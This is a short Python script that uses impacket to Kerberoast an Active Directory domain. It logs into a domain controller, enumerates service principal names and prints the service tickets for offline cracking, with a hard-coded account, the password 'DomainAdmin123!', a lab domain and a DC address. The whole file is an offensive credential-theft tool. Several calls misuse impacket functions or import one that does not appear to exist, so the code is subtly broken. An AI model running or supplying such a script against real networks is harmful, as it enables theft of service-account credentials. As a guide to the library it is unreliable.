from impacket.smbconnection import SMBConnection
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.examples.getSPNs import getSPNsForUser

def kerberoast(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Get TGT ticket for the specified user
        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip, None, None)
        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Get SPNs for the user
            spns = getSPNsForUser(username, password, domain, dc_ip)
            if spns:
                print("Kerberoastable Accounts:")
                for spn in spns:
                    # Kerberoast each account
                    principal = Principal(spn, type=Principal.NT_PRINCIPAL)
                    tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
                    print(f"TGS_REP for {spn}:")
                    print(tgs_rep.native)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)